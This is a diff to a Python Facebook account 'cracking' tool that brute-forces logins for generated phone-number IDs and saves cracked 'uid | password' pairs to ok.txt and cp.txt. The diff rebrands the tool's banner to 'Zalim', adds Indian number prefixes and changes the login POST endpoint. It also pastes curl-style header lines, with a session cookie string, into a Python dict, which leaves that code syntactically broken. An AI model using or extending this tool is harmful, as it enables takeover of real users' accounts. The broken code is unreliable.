@@ -199,19 +199,17 @@ agents = [
 
 logo = """
 
-\t\x1b[1;97m        #     #        ######   #     #     #    
-
-\t\x1b[1;92m       # #    #        #     #  #     #    # #   
-
-\t\x1b[1;97m      #   #   #        #     #  #     #   #   #  
-
-\t\x1b[1;92m     #     #  #        ######   #######  #     #
-
-\t\x1b[1;97m     #######  #        #        #     #  ####### 
-
-\t\x1b[1;92m.    #     #  #        #        #     #  #     # 
-
-\t\x1b[1;97m     #     #  #######  #        #     #  #     # 
+▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄            ▄▄▄▄▄▄▄▄▄▄▄  ▄▄       ▄▄ 
+▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌▐░░▌     ▐░░▌
+ ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌           ▀▀▀▀█░█▀▀▀▀ ▐░▌░▌   ▐░▐░▌
+          ▐░▌▐░▌       ▐░▌▐░▌               ▐░▌     ▐░▌▐░▌ ▐░▌▐░▌
+ ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌               ▐░▌     ▐░▌ ▐░▐░▌ ▐░▌
+▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌               ▐░▌     ▐░▌  ▐░▌  ▐░▌
+▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌               ▐░▌     ▐░▌   ▀   ▐░▌
+▐░▌          ▐░▌       ▐░▌▐░▌               ▐░▌     ▐░▌       ▐░▌
+▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄█░█▄▄▄▄ ▐░▌       ▐░▌
+▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌
+ ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀
 
 \x1b[1;97m --------------------------------------------------
 
@@ -219,11 +217,11 @@ logo = """
 
 \x1b[1;97m Facebook : Mohammed Shahid 
 
-\x1b[1;97m Group : Alpha Islamic Team
+\x1b[1;97m Version : 0.1
 
 \x1b[1;97m--------------------------------------------------
 
-\x1b[1;97m This is the campus of Islamic Alpha - Fuck Dark Cyber
+\x1b[1;97m Zalim
 
 \x1b[1;97m--------------------------------------------------
 
@@ -379,7 +377,7 @@ def random_number():
 
 	print(47*"-")
 
-	print('[+] For Indian Enter Four Digit Code (9934)')
+	print('[+] For Indian Enter Four Digit Code (9934) (9634) (7275) (9454) (9182)')
 
 	print(47*'-')
 
@@ -405,7 +403,7 @@ def random_number():
 
 		print('[+] Total Ids : \033[1;92m'+tl)
 
-		print('\033[1;37;1m[$] Brute Has been started...(\033[1;94mIndia\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
+		print('\033[1;37;1m[$] Brute Has been started...(\033[1;94mIndia\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mZALIM\033[1;97m) MODE BEFORE USE');print(47*"-")
 
 		for guru in user:
 
@@ -423,7 +421,7 @@ def random_number():
 
 	print('[✓] Crack process has been completed')
 
-	print('[?] Ids saved in ok.txt,cp.txt')
+	print('[?] Ids saved in zalim ok.txt,cp.txt')
 
 	print(47*"-")
 
@@ -476,7 +474,7 @@ def rcrack(uid,pwx,tl):
 			header_freefb = {'authority': 'x.facebook.com',
 			
             'method': 'POST',
-            
+           
 			'scheme': 'https',
 			
 			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -505,7 +503,7 @@ def rcrack(uid,pwx,tl):
 			
 			'User-Agent': 'Dalvik/2.1.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.136 Mobile Safari/537.36 OPR/63.3.3216.58675'}
 
-			lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			lo = session.post('https://p.facebook.com/?stype=lo&jlou=https://m.facebook.com/?stype=lo&jlou=Ac96k59wN9Oyr5a81aE&wtsid=rdr_05YVC3yLxzpmtKQwZ&_rdr_rdr',data=log_data,headers=header_freefb).text
 
 			log_cookies=session.cookies.get_dict().keys()
 
@@ -533,7 +531,7 @@ def rcrack(uid,pwx,tl):
 
 				uid = coki[141:152]
 
-				print('\r\033[1;31m[ALPHA-CP] '+uid+' | '+ps)
+				print('\r\033[1;31m[ZALIM-CP] '+uid+' | '+ps)
 
 				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
 
@@ -547,7 +545,7 @@ def rcrack(uid,pwx,tl):
 
 		loop+=1
 
-		sys.stdout.write(f"\r\x1b[1;32m[ A L P H A ]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [Cp][{len(cps)}] ")
+		sys.stdout.write(f"\r\x1b[1;32m[ ZALIM ]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [Cp][{len(cps)}] ")
 
 		sys.stdout.flush()
 
@@ -569,7 +567,7 @@ def random_pak_number():
 
 	print('[+] For PAK Code(92301) For AFG Code(93780) ETC...')
 
-	print('[+] INDIA CODES\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
+	print(47*'-')
 
 	kode = input('[?] Input Code : ')
 
@@ -607,7 +605,7 @@ def random_pak_number():
 
 	print('[✓] Crack process has been completed')
 
-	print('[?] Ids saved in ok.txt,cp.txt')
+	print('[?] Ids saved in zalim ok.txt,cp.txt')
 
 	print(47*"-")
 
@@ -655,26 +653,28 @@ def rcrack(uid,pwx,tl):
 
 			"login":"Log In"}
 
-			header_freefb = {'authority': 'p.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=X3zQZKCoj4SzVJF1I6tNifEt; sb=X3zQZFk3oETedmG4dt8U8a3Z; m_pixel_ratio=2; locale=en_US; wl_cbv=v2%3Bclient_version%3A2301%3Btimestamp%3A1691385348; vpd=v1%3B680x360x2; wd=360x680; fr=0DJiBzOHGYU7VmvhP.AWXHu92i8V7ok_62cG-Zk8BppWw.Bk0Hxf.Pi.AAA.0.0.Bk0IF2.AWXOfOMboBs',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"11.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',}
+			header_freefb = {'authority': 'p.facebook.com' \
+  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+  -H 'accept-language: en-GB,en-US;q=0.9,en;q=0.8' \
+  -H 'cache-control: max-age=0' \
+  -H 'cookie: datr=pAXsZGfPGjbREvQjWFcpbeCT; sb=pAXsZKWKFO7N6zmJoQEhSiCq; m_pixel_ratio=2.75; locale=en_GB; wl_cbv=v2%3Bclient_version%3A2312%3Btimestamp%3A1693189577; vpd=v1%3B768x393x2.75; wd=393x768; fr=0Ip4gKlvN3XRDaOjt..Bk7AWk.0O.AAA.0.0.Bk7AcW.AWX-69_PILo' \
+  -H 'dpr: 2.75' \
+  -H 'sec-ch-prefers-color-scheme: light' \
+  -H 'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"' \
+  -H 'sec-ch-ua-full-version-list: "Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"' \
+  -H 'sec-ch-ua-mobile: ?1' \
+  -H 'sec-ch-ua-model: "V2127"' \
+  -H 'sec-ch-ua-platform: "Android"' \
+  -H 'sec-ch-ua-platform-version: "13.0.0"' \
+  -H 'sec-fetch-dest: document' \
+  -H 'sec-fetch-mode: navigate' \
+  -H 'sec-fetch-site: none' \
+  -H 'sec-fetch-user: ?1' \
+  -H 'upgrade-insecure-requests: 1' \
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36' \
+  -H 'viewport-width: 980' ',}
 
-			lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			lo = session.post('https://p.facebook.com/?stype=lo&jlou=https://m.facebook.com/?stype=lo&jlou=Ac96k59wN9Oyr5a81aE&wtsid=rdr_05YVC3yLxzpmtKQwZ&_rdr_rdr',data=log_data,headers=header_freefb).text
 
 			log_cookies=session.cookies.get_dict().keys()
 
